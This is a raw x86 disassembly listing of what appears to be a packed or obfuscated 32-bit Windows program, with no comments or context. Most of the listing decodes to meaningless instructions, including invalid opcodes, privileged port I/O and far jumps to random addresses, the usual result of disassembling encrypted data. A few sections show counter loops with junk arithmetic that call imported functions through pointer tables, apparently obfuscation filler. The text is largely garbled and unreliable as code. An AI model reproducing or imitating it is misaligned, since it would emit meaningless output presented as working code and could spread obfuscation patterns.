  40aec1:	les    ebx,FWORD PTR [edi-0x3e4de999]
  40aec7:	pusha  
  40aec8:	hlt    
  40aec9:	call   0xdc2a80ac
  40aece:	retf   
  40aecf:	sub    esi,ebp
  40aed1:	int3   
  40aed2:	gs hlt 
  40aed4:	adc    DWORD PTR [edi],edi
  40aed6:	popa   
  40aed7:	push   es
  40aed8:	and    ecx,DWORD PTR ds:0x8fdc619e
  40aede:	mov    dl,0x9c
  40aee0:	lods   al,BYTE PTR ds:[esi]
  40aee1:	in     al,dx
  40aee2:	jo     0x40aee3
  40aee4:	fcomp  st(6)
  40aee6:	mov    DWORD PTR [ebx-0x2b94e22d],ecx
  40aeec:	call   0x4954c0c
  40aef1:	mov    eax,ds:0x8b83622f
  40aef6:	adc    DWORD PTR [eax+0x20],edi
  40aef9:	xchg   esp,eax
  40aefa:	push   es
  40aefb:	jo     0x40aedf
  40aefd:	fist   DWORD PTR [eiz*4-0x4dd6d7d8]
  40af04:	add    al,0xb
  40af06:	add    al,0x47
  40af08:	mov    ch,al
  40af0a:	and    ebx,DWORD PTR [ecx+edx*8-0x2a]
  40af0e:	ss push ss
  40af10:	xchg   DWORD PTR [ebx-0x1d],eax
  40af13:	shr    DWORD PTR [esi],0x63
  40af16:	imul   ebp,DWORD PTR [ebx+0x74],0xffffffcf
  40af1a:	cs push eax
  40af1c:	lods   al,BYTE PTR ds:[esi]
  40af1d:	sbb    ebp,DWORD PTR [ecx-0xa]
  40af20:	xchg   DWORD PTR [esi],eax
  40af22:	cmc    
  40af23:	les    ebx,FWORD PTR [edi-0x5e]
  40af26:	sub    al,0x57
  40af28:	loopne 0x40af14
  40af2a:	inc    eax
  40af2b:	fistp  QWORD PTR [esi-0x4a]
  40af2e:	lods   eax,DWORD PTR ds:[esi]
  40af2f:	add    eax,0x89692dff
  40af34:	test   DWORD PTR [esi],esp
  40af36:	xor    DWORD PTR [esi],esi
  40af38:	dec    ebx
  40af39:	(bad)  
  40af3a:	repnz call 0xecc4:0xc1ba7cab
  40af42:	dec    esi
  40af43:	push   ds
  40af44:	je     0x40af49
  40af46:	cwde   
  40af47:	repz pop es
  40af49:	jnp    0x40aed2
  40af4b:	pop    esi
  40af4c:	in     al,dx
  40af4d:	loopne 0x40af42
  40af4f:	mul    DWORD PTR ds:0x99d0fe9c
  40af55:	pushf  
  40af56:	adc    DWORD PTR [ecx-0x21],esp
  40af59:	addr16 pop ss
  40af5b:	pop    eax
  40af5c:	outs   dx,DWORD PTR ds:[esi]
  40af5d:	sub    bh,BYTE PTR [ebx]
  40af5f:	inc    ebp
  40af60:	push   ds
  40af61:	in     al,0x8d
  40af63:	xchg   edx,ecx
  40af65:	inc    ebx
  40af66:	fptan  
  40af68:	jae    0x40af13
  40af6a:	dec    eax
  40af6b:	or     bl,BYTE PTR [ebp-0x11]
  40af6e:	and    eax,0x4965acac
  40af73:	pop    ss
  40af74:	dec    ebp
  40af75:	cwde   
  40af76:	rcr    al,0x59
  40af79:	push   eax
  40af7a:	call   0x97514353
  40af7f:	adc    al,0x57
  40af81:	mov    edx,0xa2a1310c
  40af86:	into   
  40af87:	neg    DWORD PTR [edx+0x9]
  40af8a:	bound  edi,QWORD PTR [ecx]
  40af8c:	sti    
  40af8d:	enter  0x9d98,0x25
  40af91:	jo     0x40af2b
  40af93:	fidivr DWORD PTR [ebx+0x31a25bc0]
  40af99:	loop   0x40afb5
  40af9b:	xchg   ebp,eax
  40af9c:	sbb    DWORD PTR [ebp+0xa5b19cf],0x7a
  40afa3:	pop    ds
  40afa4:	pop    edi
  40afa5:	dec    ebp
  40afa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afa7:	pusha  
  40afa8:	inc    ebp
  40afa9:	data16 hlt 
  40afab:	mov    esi,0x75b2d1e8
  40afb0:	test   eax,0xdc16f7e5
  40afb5:	cmp    al,0xa7
  40afb7:	dec    ecx
  40afb8:	mov    esp,0x6ddd064a
  40afbd:	mov    ecx,DWORD PTR [ebp-0x161e9dc9]
  40afc3:	dec    ecx
  40afc4:	lds    eax,FWORD PTR [edi-0x59]
  40afc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afc8:	mov    esi,0x5b2544d3
  40afcd:	push   esi
  40afce:	popf   
  40afcf:	inc    ebp
  40afd0:	xor    DWORD PTR [edi+0x699d31c],edx
  40afd6:	neg    BYTE PTR [edi]
  40afd8:	daa    
  40afd9:	dec    ecx
  40afda:	loop   0x40b024
  40afdc:	in     eax,0xc3
  40afde:	mov    edi,0xdd7012ac
  40afe3:	cmc    
  40afe4:	xor    BYTE PTR [eax],ah
  40afe6:	mov    ebp,DWORD PTR [ecx-0x3a]
  40afe9:	sbb    ebx,edi
  40afeb:	jo     0x40afcd
  40afed:	sbb    BYTE PTR [edi],al
  40afef:	loope  0x40b056
  40aff1:	lahf   
  40aff2:	test   edx,ecx
  40aff4:	(bad)  
  40aff5:	shr    BYTE PTR [edx+esi*8+0x13],1
  40aff9:	xor    eax,0xd794ea15
  40affe:	pop    esp
  40afff:	in     eax,0x91
  40b001:	adc    DWORD PTR [edx+0x3e],edi
  40b004:	icebp  
  40b005:	lock out dx,al
  40b007:	in     eax,0x4f
  40b009:	(bad)  
  40b00a:	in     al,dx
  40b00b:	icebp  
  40b00c:	mov    ch,al
  40b00e:	test   BYTE PTR [ebx+0x42172a3b],bh
  40b014:	(bad)  
  40b016:	call   0xd736:0x873c7385
  40b01d:	int    0x35
  40b01f:	sbb    edi,DWORD PTR [ebx+0x0]
  40b022:	(bad)  
  40b023:	out    0x4a,al
  40b025:	pushf  
  40b026:	xchg   edi,eax
  40b027:	and    edi,esp
  40b029:	loopne 0x40afaf
  40b02b:	pop    ss
  40b02c:	dec    edx
  40b02d:	repz mov edx,0x74f6c389
  40b033:	mov    edi,0xa48e31f1
  40b038:	ins    DWORD PTR es:[edi],dx
  40b039:	js     0x40b09f
  40b03b:	aam    0x96
  40b03d:	pop    ecx
  40b03e:	cld    
  40b03f:	stc    
  40b040:	add    BYTE PTR ds:[ecx],al
  40b043:	cmp    eax,0xb9036dd7
  40b048:	or     DWORD PTR [ecx-0x35],ebp
  40b04b:	imul   ebp,eax,0x4eb621b3
  40b051:	sub    DWORD PTR cs:[edx],edx
  40b054:	add    ch,cl
  40b056:	push   eax
  40b057:	jmp    0x40afe3
  40b059:	data16 sbb ax,0x705f
  40b05e:	pop    ss
  40b05f:	lock xor eax,0xa26610d2
  40b065:	jmp    0x81ea:0x53bf8a8f
  40b06c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b06d:	cmp    DWORD PTR [eax-0x70],edi
  40b070:	pop    es
  40b071:	cmp    al,0xd6
  40b073:	mov    al,0xd3
  40b075:	sbb    al,0xa7
  40b077:	push   DWORD PTR [edx]
  40b079:	loop   0x40b0de
  40b07b:	mov    ch,dl
  40b07d:	lea    ebx,[esi-0x55]
  40b080:	add    BYTE PTR [edi*2+0x68dd34a4],0xb1
  40b088:	inc    esp
  40b089:	outs   dx,BYTE PTR ds:[esi]
  40b08a:	jmp    0xdfd398e5
  40b08f:	mul    DWORD PTR [edx+0x6a]
  40b092:	xchg   BYTE PTR [esi],bh
  40b094:	adc    BYTE PTR [esi],dl
  40b096:	nop
  40b097:	inc    ecx
  40b098:	shl    eax,0xe3
  40b09b:	adc    esi,DWORD PTR [ebx]
  40b09d:	ret    0xf233
  40b0a0:	add    eax,ecx
  40b0a2:	add    esi,ecx
  40b0a4:	imul   eax,esi
  40b0a7:	mov    esi,DWORD PTR [ebp+0xc]
  40b0aa:	cmp    esi,eax
  40b0ac:	mov    eax,DWORD PTR [ebp-0x4]
  40b0af:	je     0x40aa89
  40b0b5:	xor    eax,edx
  40b0b7:	add    eax,ecx
  40b0b9:	mov    ecx,DWORD PTR [ebp+0xc]
  40b0bc:	imul   eax,ecx
  40b0bf:	add    eax,DWORD PTR [ebp+0x8]
  40b0c2:	mov    DWORD PTR [ebp+0xc],eax
  40b0c5:	mov    eax,DWORD PTR [ebp+0xc]
  40b0c8:	jmp    0x40b2c3
  40b0cd:	fadd   QWORD PTR [edi-0x18]
  40b0d0:	(bad)  
  40b0d1:	ins    DWORD PTR es:[edi],dx
  40b0d2:	jns    0x40b0d0
  40b0d4:	pop    ebp
  40b0d5:	xchg   BYTE PTR [ebx+0xb],cl
  40b0d8:	xor    cl,BYTE PTR [ebx-0x624b44e9]
  40b0de:	loop   0x40b15e
  40b0e0:	jle    0x40b13e
  40b0e2:	jg     0x40b162
  40b0e4:	jle    0x40b08a
  40b0e6:	and    BYTE PTR [esi+0x18],bl
  40b0e9:	jl     0x40b091
  40b0eb:	aam    0xe8
  40b0ed:	cmc    
  40b0ee:	sbb    edi,DWORD PTR [edx]
  40b0f0:	cmp    eax,0x31d3bdb7
  40b0f5:	mov    esp,0x9299d4a7
  40b0fa:	lock and DWORD PTR [edi+0x4e898331],eax
  40b101:	xchg   BYTE PTR [eax-0x7879b167],al
  40b107:	xchg   esp,eax
  40b108:	sub    ah,0x5c
  40b10b:	jge    0x40b169
  40b10d:	in     al,0x88
  40b10f:	jmp    DWORD PTR [edi]
  40b111:	pop    ebx
  40b112:	ficomp DWORD PTR [ecx+0x606a5adf]
  40b118:	adc    al,0x63
  40b11a:	dec    esi
  40b11b:	or     edi,DWORD PTR [esi+0x5d63cec5]
  40b121:	jg     0x40b0f6
  40b123:	inc    eax
  40b124:	enter  0x598d,0x4
  40b128:	dec    eax
  40b129:	cwde   
  40b12a:	jo     0x40b131
  40b12c:	aad    0x80
  40b12e:	xchg   ebp,eax
  40b12f:	xor    eax,0x67fdcc4d
  40b134:	xor    eax,0xfaf63941
  40b139:	xchg   edx,eax
  40b13a:	add    DWORD PTR [edi+0x263f19e0],ecx
  40b140:	inc    ebx
  40b141:	mov    cl,0xed
  40b143:	test   eax,0xd47ee097
  40b148:	push   esi
  40b149:	sahf   
  40b14a:	aaa    
  40b14b:	xchg   BYTE PTR [ebx+0x25],ah
  40b14e:	xlat   BYTE PTR ds:[ebx]
  40b14f:	loop   0x40b0e1
  40b151:	inc    ecx
  40b152:	iret   
  40b153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b154:	rol    DWORD PTR [edx+0x676d6239],1
  40b15a:	bound  edx,QWORD PTR [edi-0x27]
  40b15d:	lods   eax,DWORD PTR ds:[esi]
  40b15e:	lods   al,BYTE PTR ds:[esi]
  40b15f:	fxch   st(6)
  40b161:	aam    0x9a
  40b163:	icebp  
  40b164:	sbb    BYTE PTR [esi+ecx*1-0x7377be2d],dh
  40b16b:	ret    
  40b16c:	(bad)  
  40b16d:	inc    BYTE PTR [esi-0x6b049c97]
  40b173:	or     edi,DWORD PTR [esi-0x6d0c7aee]
  40b179:	inc    esi
  40b17a:	pop    esi
  40b17b:	jg     0x40b1e9
  40b17d:	push   ecx
  40b17e:	enter  0x63bc,0x65
  40b182:	fadd   QWORD PTR [edx+ebx*2+0x77]
  40b186:	inc    eax
  40b187:	popa   
  40b188:	inc    ebx
  40b189:	jns    0x40b135
  40b18b:	xchg   DWORD PTR [edi-0x78],ebp
  40b18e:	mov    dh,0x76
  40b190:	mov    bl,0x61
  40b192:	mov    DWORD PTR [ebp+0x53],esp
  40b195:	aaa    
  40b196:	mov    edi,0x38b2f747
  40b19b:	outs   dx,BYTE PTR es:[esi]
  40b19d:	or     eax,0xda27687a
  40b1a2:	or     ecx,edi
  40b1a4:	push   esi
  40b1a5:	test   al,0x8e
  40b1a7:	jg     0x40b1d9
  40b1a9:	stc    
  40b1aa:	xchg   ecx,eax
  40b1ab:	adc    al,0xdb
  40b1ad:	cwde   
  40b1ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1af:	push   ds
  40b1b0:	mov    ds:0xd1092d56,eax
  40b1b5:	xor    ch,BYTE PTR ds:0x16b2a33c
  40b1bb:	ret    
  40b1bc:	xchg   ebp,eax
  40b1bd:	rcl    BYTE PTR [ebx+0x4b],0x6d
  40b1c1:	loopne 0x40b192
  40b1c3:	pop    eax
  40b1c4:	test   al,0x17
  40b1c6:	clc    
  40b1c7:	or     edi,DWORD PTR [ecx-0xd]
  40b1ca:	cmp    edi,DWORD PTR [edi+0x3bd6c948]
  40b1d0:	loop   0x40b178
  40b1d2:	lahf   
  40b1d3:	xchg   esp,eax
  40b1d4:	aas    
  40b1d5:	adc    dl,ah
  40b1d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1d8:	jmp    0xd384:0xd4823fb9
  40b1df:	or     DWORD PTR [edx],edi
  40b1e1:	in     eax,0xd7
  40b1e3:	inc    eax
  40b1e4:	arpl   WORD PTR [esi-0x313c1170],dx
  40b1ea:	adc    ecx,edx
  40b1ec:	test   DWORD PTR [edi],esi
  40b1ee:	xchg   ecx,eax
  40b1ef:	aam    0xd0
  40b1f1:	jne    0x40b18a
  40b1f3:	ins    DWORD PTR es:[edi],dx
  40b1f4:	jmp    0x3aed87c5
  40b1f9:	xchg   ebx,eax
  40b1fa:	sti    
  40b1fb:	stos   DWORD PTR es:[edi],eax
  40b1fc:	aaa    
  40b1fd:	pusha  
  40b1fe:	hlt    
  40b1ff:	or     DWORD PTR [eax-0x66],ebp
  40b202:	mov    es,ecx
  40b204:	repnz stos BYTE PTR es:[edi],al
  40b206:	test   BYTE PTR [eax-0x1d],ch
  40b209:	mov    ds:0x494499c3,al
  40b20e:	ins    BYTE PTR es:[edi],dx
  40b20f:	inc    edx
  40b210:	in     al,0x85
  40b212:	fmul   DWORD PTR [ecx-0x499ac23d]
  40b218:	fstp   QWORD PTR [edi-0x6c]
  40b21b:	jno    0x40b1f5
  40b21d:	or     BYTE PTR [eax-0xf],cl
  40b220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b221:	lds    esi,FWORD PTR [ecx-0x65aac7e8]
  40b227:	mov    esi,DWORD PTR [edi+0x7fa36b09]
  40b22d:	add    eax,0x7b0797bc
  40b232:	out    0xec,al
  40b234:	push   edi
  40b235:	mov    dh,0x6
  40b237:	add    ch,BYTE PTR [esi+ebx*4-0x5303ea01]
  40b23e:	lods   eax,DWORD PTR ds:[esi]
  40b23f:	je     0x40b280
  40b241:	in     al,dx
  40b242:	pop    esp
  40b243:	neg    BYTE PTR [esi+0x5c]
  40b246:	add    al,0x67
  40b248:	cmc    
  40b249:	jmp    0x40b280
  40b24b:	or     eax,0x3cfeefae
  40b250:	xor    DWORD PTR [ebp+0x6e99df83],esi
  40b256:	mov    edx,0x4ee4d6e0
  40b25b:	jo     0x40b24a
  40b25d:	retf   
  40b25e:	lock es stos DWORD PTR es:[edi],eax
  40b261:	pop    esi
  40b262:	pop    esi
  40b263:	and    ch,BYTE PTR [ebp+0x2e]
  40b266:	fidiv  DWORD PTR [ebx+0x606a89af]
  40b26c:	mov    ds:0x47ee6d6e,al
  40b271:	mov    ebx,0x903aee4d
  40b276:	adc    eax,0x6b351f9e
  40b27b:	jb     0x40b2c7
  40b27d:	push   esp
  40b27e:	lahf   
  40b27f:	pop    ebp
  40b280:	sub    BYTE PTR [edi],ch
  40b282:	xor    BYTE PTR [ebx-0x6b],bh
  40b285:	call   0xbc2f:0x82861354
  40b28c:	adc    eax,0xecbaeae5
  40b291:	lds    ebp,FWORD PTR [edi+0x6b]
  40b294:	ja     0x40b249
  40b296:	or     BYTE PTR [edi+edx*4],al
  40b299:	inc    ebp
  40b29a:	lahf   
  40b29b:	cmp    ebp,edi
  40b29d:	sub    DWORD PTR [edx-0x339ad66d],eax
  40b2a3:	cwde   
  40b2a4:	jl     0x40b235
  40b2a6:	or     eax,0x9314d4e8
  40b2ab:	aam    0xa4
  40b2ad:	fadd   DWORD PTR [ecx+0x2b]
  40b2b0:	or     eax,0x2eeee668
  40b2b5:	mov    dh,BYTE PTR ds:0x420eb72a
  40b2bb:	pusha  
  40b2bc:	cld    
  40b2bd:	sub    al,0x8d
  40b2bf:	mov    ebp,0x5e32feea
  40b2c4:	leave  
  40b2c5:	ret    0x8
  40b2c8:	push   ebp
  40b2c9:	mov    ebp,esp
  40b2cb:	sub    esp,0x30
  40b2ce:	mov    eax,ds:0x43066e
  40b2d3:	mov    ecx,DWORD PTR ds:0x43067a
  40b2d9:	sub    ecx,eax
  40b2db:	imul   eax,DWORD PTR [eax+ecx*1]
  40b2df:	jmp    0x40b43d
  40b2e4:	adc    eax,0x6533e552
  40b2e9:	inc    ebp
  40b2ea:	and    eax,0x241ce54
  40b2ef:	scas   al,BYTE PTR es:[edi]
  40b2f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2f1:	fdiv   st(5),st
  40b2f3:	call   0x7ebf97f3
  40b2f8:	aas    
  40b2f9:	jg     0x40b379
  40b2fb:	jle    0x40b35a
  40b2fd:	sub    BYTE PTR [ebx-0x8],bh
  40b300:	ror    DWORD PTR [ecx+0x55b2c540],1
  40b306:	xchg   BYTE PTR [edi],dl
  40b308:	ss jmp 0x8abaac6f
  40b30e:	ret    0xcdae
  40b311:	je     0x40b303
  40b313:	lea    edx,ds:0x3a525692
  40b319:	imul   esp,DWORD PTR [ebx-0x41fbe6dd],0x5a65106
  40b323:	adc    BYTE PTR [edi-0x5d3bea40],ch
  40b329:	std    
  40b32a:	imul   BYTE PTR [ebp-0x59abfff2]
  40b330:	test   eax,0x25fb6851
  40b335:	stc    
  40b336:	int3   
  40b337:	fiadd  WORD PTR [esi]
  40b339:	cwde   
  40b33a:	sbb    al,0x39
  40b33c:	fisttp DWORD PTR [esi+0x870f1f2]
  40b342:	and    al,0xd4
  40b344:	mov    eax,ds:0xdcdbecf
  40b349:	xor    DWORD PTR [edx+0x58aaa4ab],0x12
  40b350:	inc    ecx
  40b351:	xor    esi,DWORD PTR [eax]
  40b353:	aaa    
  40b354:	cmp    BYTE PTR [ecx],dh
  40b356:	inc    esi
  40b357:	les    edi,FWORD PTR [ebx+esi*1+0x49]
  40b35b:	pop    ecx
  40b35c:	lods   eax,DWORD PTR ds:[esi]
  40b35d:	xchg   ecx,eax
  40b35e:	mov    eax,ds:0x18378424
  40b363:	pop    esp
  40b364:	xchg   ecx,eax
  40b365:	dec    edi
  40b366:	cld    
  40b367:	jle    0x40b35b
  40b369:	mov    ah,0x73
  40b36b:	repnz xchg ah,ch
  40b36e:	or     ah,dh
  40b370:	icebp  
  40b371:	scas   al,BYTE PTR es:[edi]
  40b372:	sbb    ah,BYTE PTR [ecx+0x50411592]
  40b378:	fs je  0x40b3b9
  40b37b:	sbb    esp,DWORD PTR [ebp+0x435f426e]
  40b381:	xlat   BYTE PTR ds:[ebx]
  40b382:	mov    cl,0x60
  40b384:	dec    ebx
  40b385:	cwde   
  40b386:	aam    0xab
  40b388:	cmp    eax,0xb4396ec7
  40b38d:	inc    esi
  40b38e:	rcr    edx,0x41
  40b391:	xor    al,dh
  40b393:	inc    ecx
  40b394:	outs   dx,DWORD PTR ds:[esi]
  40b395:	rcr    BYTE PTR [esi],0x91
  40b398:	inc    ecx
  40b399:	jnp    0x40b364
  40b39b:	in     eax,dx
  40b39c:	push   eax
  40b39d:	dec    ebp
  40b39e:	std    
  40b39f:	cmc    
  40b3a0:	out    0xdf,eax
  40b3a2:	out    dx,eax
  40b3a3:	out    dx,al
  40b3a4:	cmp    DWORD PTR [edi],ebp
  40b3a6:	xchg   BYTE PTR ds:0xf7de8374,bh
  40b3ac:	mov    dh,ch
  40b3ae:	popa   
  40b3af:	sahf   
  40b3b0:	fs push edx
  40b3b2:	xor    eax,0x51f8e30f
  40b3b7:	jo     0x40b342
  40b3b9:	add    ebx,DWORD PTR [esi-0x9f5f517]
  40b3bf:	bound  esp,QWORD PTR [esi-0x1225b38]
  40b3c5:	jmp    0x69404aec
  40b3ca:	pop    ebx
  40b3cb:	push   ebx
  40b3cc:	(bad)  
  40b3cd:	fst    QWORD PTR [esi+0x75fb4724]
  40b3d3:	clc    
  40b3d4:	mov    bh,0x5
  40b3d6:	inc    esi
  40b3d7:	sub    BYTE PTR [edx-0x7e],bl
  40b3da:	aam    0x78
  40b3dc:	jmp    FWORD PTR [edi]
  40b3de:	not    DWORD PTR [ecx-0x4b96c2e4]
  40b3e4:	pop    edx
  40b3e5:	mov    esi,0x93230b0e
  40b3ea:	fldenv [edx-0x1f]
  40b3ed:	mov    al,ds:0x955437b6
  40b3f2:	and    BYTE PTR [ebp+0x57d5bfad],dl
  40b3f8:	loop   0x40b43a
  40b3fa:	push   edi
  40b3fb:	adc    eax,0xf09a7c47
  40b400:	adc    DWORD PTR [ecx-0x25],esi
  40b403:	scas   eax,DWORD PTR es:[edi]
  40b404:	add    al,0x91
  40b406:	fucomi st,st(7)
  40b408:	cmp    ch,al
  40b40a:	in     al,0xcf
  40b40c:	jno    0x40b42d
  40b40e:	and    DWORD PTR ds:0xff330894,ebx
  40b414:	xchg   ebx,eax
  40b415:	xor    DWORD PTR [eax+0x929bc62],esp
  40b41b:	push   0x26b14ff0
  40b420:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b421:	push   ds
  40b422:	in     eax,dx
  40b423:	mov    al,0xb3
  40b425:	mov    esp,0xa76ab16a
  40b42a:	stc    
  40b42b:	xchg   edi,eax
  40b42c:	test   DWORD PTR [esi],ecx
  40b42e:	out    0xe1,eax
  40b430:	das    
  40b431:	add    DWORD PTR [edi],ebx
  40b433:	fmul   QWORD PTR [esi]
  40b435:	mov    dl,0x2d
  40b437:	inc    eax
  40b438:	lods   al,BYTE PTR ds:[esi]
  40b439:	cmp    DWORD PTR [esi],edx
  40b43b:	mov    ah,0xa6
  40b43d:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40b444:	mov    DWORD PTR ds:0x43064e,0x11
  40b44e:	cmp    DWORD PTR ds:0x43064e,0x0
  40b455:	je     0x40b489
  40b45b:	cmp    DWORD PTR ds:0x43064e,0x19
  40b462:	jne    0x40b479
  40b468:	push   DWORD PTR [ebp-0x24]
  40b46b:	push   DWORD PTR [ebp-0x20]
  40b46e:	push   0x41ff
  40b473:	call   DWORD PTR ds:0x42ebe8
  40b479:	mov    eax,ds:0x43064e
  40b47e:	dec    eax
  40b47f:	mov    ds:0x43064e,eax
  40b484:	jmp    0x40b44e
  40b489:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40b490:	or     eax,0x1c5c
  40b495:	mov    ecx,DWORD PTR [ebp-0x4]
  40b498:	push   ebx
  40b499:	add    DWORD PTR ds:0x4305ae,edi
  40b49f:	mov    eax,0x7510856
  40b4a4:	mov    ebx,DWORD PTR ds:0x430642
  40b4aa:	sbb    DWORD PTR ds:0x42e862,ebx
  40b4b0:	xor    ecx,eax
  40b4b2:	mov    ebx,DWORD PTR ds:0x42ef14
  40b4b8:	sub    DWORD PTR ds:0x43058e,ebx
  40b4be:	mov    ebx,0x32729d
  40b4c3:	xor    DWORD PTR ds:0x430646,0xece
  40b4cd:	add    ecx,ebx
  40b4cf:	xor    DWORD PTR ds:0x430596,0x42e86a
  40b4d9:	mov    DWORD PTR [ebp-0x1c],ecx
  40b4dc:	mov    ecx,DWORD PTR [ebp+0x14]
  40b4df:	xor    DWORD PTR ds:0x42ef1c,0x65f3
  40b4e9:	push   esi
  40b4ea:	sub    DWORD PTR ds:0x42e862,0x2022
  40b4f4:	push   edi
  40b4f5:	and    DWORD PTR ds:0x430646,0x430592
  40b4ff:	test   ecx,ecx
  40b501:	mov    DWORD PTR ds:0x42e85e,0x17b6
  40b50b:	je     0x40b58a
  40b511:	add    ecx,0x2345
  40b517:	mov    ecx,DWORD PTR [ebp+0x14]
  40b51a:	and    DWORD PTR ds:0x4305a6,0x0
  40b524:	jmp    0x40b536
  40b529:	mov    edi,DWORD PTR ds:0x4305a6
  40b52f:	inc    edi
  40b530:	mov    DWORD PTR ds:0x4305a6,edi
  40b536:	cmp    DWORD PTR ds:0x4305a6,0x1d
  40b53d:	jae    0x40b585
  40b543:	cmp    DWORD PTR ds:0x4305a6,0x4
  40b54a:	jne    0x40b560
  40b550:	push   0x42ef1c
  40b555:	push   0x6d9e
  40b55a:	call   DWORD PTR ds:0x42ebec
  40b560:	cmp    DWORD PTR ds:0x4305a6,0x3
  40b567:	jne    0x40b57a
  40b56d:	mov    edi,DWORD PTR ds:0x4305a6
  40b573:	inc    edi
  40b574:	mov    DWORD PTR ds:0x4305a6,edi
  40b57a:	jmp    0x40b529
  40b57f:	and    esi,0x3dcd
  40b585:	mov    ecx,DWORD PTR [ecx]
  40b587:	mov    DWORD PTR [ebp-0x1c],ecx
  40b58a:	movzx  esi,BYTE PTR ds:0x430592
  40b591:	xor    DWORD PTR ds:0x4305ba,esi
  40b597:	imul   edx,eax
  40b59a:	or     DWORD PTR ds:0x4305be,edx
  40b5a0:	mov    ecx,0x4573
  40b5a5:	xor    esi,DWORD PTR ds:0x430586
  40b5ab:	add    edx,ecx
  40b5ad:	mov    esi,0x7879
  40b5b2:	and    DWORD PTR ds:0x43063e,0x0
  40b5bc:	mov    edi,DWORD PTR ds:0x43063e
  40b5c2:	inc    edi
  40b5c3:	mov    DWORD PTR ds:0x43063e,edi
  40b5c9:	cmp    DWORD PTR ds:0x43063e,0x12
  40b5d0:	jne    0x40b5f7
  40b5d6:	push   0x1
  40b5d8:	push   0x3333
  40b5dd:	push   0x7164
  40b5e2:	push   0x26d7
  40b5e7:	push   0x1d14
  40b5ec:	push   0x64d6
  40b5f1:	call   DWORD PTR ds:0x42ebf0
  40b5f7:	cmp    DWORD PTR ds:0x43063e,0x11
  40b5fe:	jne    0x40b613
  40b604:	xor    edi,edi
  40b606:	or     edi,DWORD PTR ds:0x43063e
  40b60c:	inc    edi
  40b60d:	mov    DWORD PTR ds:0x43063e,edi
  40b613:	cmp    DWORD PTR ds:0x43063e,0x1f
  40b61a:	jb     0x40b5bc
  40b620:	dec    edi
  40b621:	mov    edi,0x1556
  40b626:	xchg   esi,ecx
  40b628:	sub    edx,edi
  40b62a:	xor    esi,esi
  40b62c:	jmp    0x40b78a
  40b631:	mov    ch,dh
  40b633:	add    esi,DWORD PTR [eax+0x7b]
  40b636:	aad    0x9d
  40b638:	jl     0x40b646
  40b63a:	mov    eax,0x18f84dc4
  40b63f:	adc    dl,BYTE PTR [edi+0x7e7ee5bc]
  40b645:	aas    
  40b646:	jg     0x40b6c6
  40b648:	jle    0x40b636
  40b64a:	repnz mov esi,0x8e45ef15
  40b650:	dec    esp
  40b651:	cli    
  40b652:	xchg   ebx,eax
  40b653:	loope  0x40b66b
  40b655:	sbb    BYTE PTR [edi],0xea
  40b658:	fstp   QWORD PTR [edx-0x40]
  40b65b:	sbb    DWORD PTR [ebp-0x56c92a1b],ecx
  40b661:	aaa    
  40b662:	xchg   DWORD PTR [ebx+0x4],ecx
  40b665:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b666:	pop    edx
  40b667:	add    ch,BYTE PTR [edi+0x642a5d1a]
  40b66d:	daa    
  40b66e:	add    BYTE PTR [eax+0x15],0xc5
  40b672:	(bad)  
  40b674:	and    BYTE PTR [ecx],al
  40b676:	ret    
  40b677:	cdq    
  40b678:	enter  0x8c5c,0x3f
  40b67c:	cmp    DWORD PTR [esi-0x660ec2fd],esp
  40b682:	jl     0x40b6a3
  40b684:	pop    ds
  40b685:	test   DWORD PTR ds:0xa63ec7db,ebx
  40b68b:	aas    
  40b68c:	inc    ebx
  40b68d:	aad    0x62
  40b68f:	jecxz  0x40b6b3
  40b691:	scas   eax,DWORD PTR es:[edi]
  40b692:	mov    al,0xda
  40b694:	dec    edx
  40b695:	xchg   bh,al
  40b697:	sub    ecx,edi
  40b699:	mov    WORD PTR [esi-0x3b],ss
  40b69c:	repz xor al,0x4c
  40b69f:	add    edi,DWORD PTR [eax-0x42bed0f3]
  40b6a5:	(bad)  
  40b6a6:	xchg   ecx,eax
  40b6a7:	push   edi
  40b6a8:	sbb    ecx,edx
  40b6aa:	(bad)  
  40b6ab:	sbb    BYTE PTR [ebx+0x5b5824f7],al
  40b6b1:	push   esi
  40b6b2:	fisttp WORD PTR [edx-0x69]
  40b6b5:	mov    WORD PTR [esi-0x74c2d0dc],es
  40b6bb:	sbb    ch,cl
  40b6bd:	cmp    BYTE PTR [edx],ch
  40b6bf:	inc    esi
  40b6c0:	test   DWORD PTR [ebx],edx
  40b6c2:	inc    ebx
  40b6c3:	aam    0xb3
  40b6c5:	and    esp,DWORD PTR [ebp-0x456d6d7a]
  40b6cb:	push   es
  40b6cc:	in     eax,0x72
  40b6ce:	mov    ebp,esi
  40b6d0:	test   DWORD PTR [edi+0x60],esp
  40b6d3:	mov    esp,0xc71130a5
  40b6d8:	push   edi
  40b6d9:	jge    0x40b713
  40b6db:	push   ebp
  40b6dc:	mov    bh,0x4d
  40b6de:	es hlt 
  40b6e0:	inc    ebx
  40b6e1:	hlt    
  40b6e2:	sbb    al,ah
  40b6e4:	dec    ebx
  40b6e5:	xor    eax,0x93f396df
  40b6ea:	pop    ecx
  40b6eb:	pop    esi
  40b6ec:	sahf   
  40b6ed:	out    0x70,al
  40b6ef:	or     al,0x6c
  40b6f1:	mov    bh,0xab
  40b6f3:	sub    al,BYTE PTR [esi-0x1d]
  40b6f6:	mov    WORD PTR [eax+0x2],?
  40b6f9:	sar    DWORD PTR [ebx-0x25],cl
  40b6fc:	loopne 0x40b70f
  40b6fe:	outs   dx,BYTE PTR ds:[esi]
  40b6ff:	mov    ds:0x5da4c31f,al
  40b704:	sbb    eax,0x654c5d95
  40b709:	sub    al,0x40
  40b70b:	jno    0x40b6f7
  40b70d:	and    eax,ecx
  40b70f:	pop    edi
  40b710:	(bad)  
  40b711:	rcl    ecx,1
  40b713:	fimul  WORD PTR [ebx-0x57]
  40b716:	call   0x5479b2da
